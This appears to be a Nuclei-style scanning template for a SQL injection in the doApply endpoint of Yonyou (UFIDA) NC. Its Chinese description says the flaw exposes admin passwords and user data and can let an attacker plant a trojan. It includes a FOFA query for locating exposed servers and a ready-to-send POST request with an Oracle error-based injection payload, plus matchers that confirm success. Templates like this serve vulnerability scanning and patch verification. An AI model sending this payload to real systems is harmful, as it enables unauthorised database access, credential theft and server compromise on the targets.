id: yongyouNC-doApply-sql

info:
  tags: yongyouNC-doApply-sql
  name: 用友NC doApply SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC doApply 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        POST /portal/pt/mtapptimeline/doApply HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        pageId=login&meapk=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(122)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(98)||CHR(113))-- Jvzs
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'qzjbq1qxxbq'
      - type: status
        status: 
          - 500
